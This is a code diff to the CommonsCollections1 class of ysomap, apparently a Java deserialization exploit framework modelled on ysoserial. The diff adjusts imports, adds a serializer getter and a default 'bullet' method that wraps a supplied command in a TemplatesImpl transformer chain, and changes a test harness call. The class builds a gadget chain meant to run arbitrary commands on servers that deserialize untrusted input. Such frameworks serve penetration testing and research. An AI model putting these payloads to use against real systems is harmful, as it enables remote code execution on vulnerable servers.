@@ -4,12 +4,14 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.map.LazyMap;
-import ysomap.PayloadTester;
+import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
 import ysomap.gadget.ObjectGadget;
 import ysomap.gadget.bullet.collections.TransformerWithTemplatesImplBullet;
 import ysomap.gadget.payload.Payload;
+import ysomap.serializer.Serializer;
+import ysomap.serializer.SerializerFactory;
 import ysomap.util.PayloadHelper;
 import ysomap.util.Reflections;
 
@@ -33,6 +35,11 @@ public class CommonsCollections1 extends Payload<InvocationHandler> {
     }
 
     @Override
+    public Serializer<?> getSerializer() {
+        return SerializerFactory.createSerializer("");
+    }
+
+    @Override
     public InvocationHandler pack(Object obj) throws Exception {
         // inert chain for setup
         final Transformer transformerChain = new ChainedTransformer(
@@ -50,8 +57,13 @@ public class CommonsCollections1 extends Payload<InvocationHandler> {
         return handler;
     }
 
+    @Override
+    public ObjectGadget getDefaultBullet(String command) {
+        return new TransformerWithTemplatesImplBullet(command,"3");
+    }
+
     public static void main(String[] args) {
-        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null,3);
+        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null,"3");
 //        new PayloadTester(CommonsCollections1.class).run();//ysoserial CommonsCollections1
         new PayloadTester(CommonsCollections1.class)// ysoserial CommonsCollections3
                 .setBullet(bullet)
